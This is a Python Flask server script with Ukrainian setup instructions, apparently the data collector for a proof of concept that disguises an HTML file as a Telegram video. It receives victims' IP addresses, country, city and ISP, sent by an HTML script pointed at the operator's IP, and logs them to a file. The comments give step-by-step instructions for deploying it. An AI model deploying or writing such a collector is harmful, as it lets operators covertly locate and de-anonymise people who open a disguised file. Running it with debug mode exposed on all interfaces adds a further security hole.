# server_logger.py
# 
# This script is based on the original source from:
# https://github.com/0x6rss/telegram-video-extension-manipulation-PoC/blob/main/server.py
#
# === ІНСТРУКЦІЯ ЗАПУСКУ ===
# 1. Встановіть Flask, якщо він ще не встановлений:
#    pip install flask
#
# 2. Запустіть сервер:
#    python3 server_logger.py
#
# 3. Сервер буде працювати за адресою:
#    http://0.0.0.0:5000/log_ip
#
# 4. Щоб зупинити сервер, натисніть Ctrl+C.
#
# === НАЛАШТУВАННЯ ===
# - Замініть XX.XX.XX.XX в HTML-скрипті на реальну IP-адресу сервера.
# - Переконайтеся, що порт 5000 відкритий для отримання запитів.
#

from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  

@app.route('/log_ip', methods=['POST'])
def log_ip():
    try:
        data = request.json  
        if not data:
            return jsonify({"error": "No data received"}), 400

        ip_address = data.get('ip')
        country = data.get('country')
        region = data.get('region')
        city = data.get('city')
        isp = data.get('isp')

        if ip_address:
            log_entry = f"IP: {ip_address} | Country: {country} | Region: {region} | City: {city} | ISP: {isp}\n"


            with open("ip_log.txt", "a") as file:
                file.write(log_entry)

            print("Logged:", log_entry)  

            return jsonify({"message": "IP logged"}), 200

        return jsonify({"error": "Invalid data format"}), 400

    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
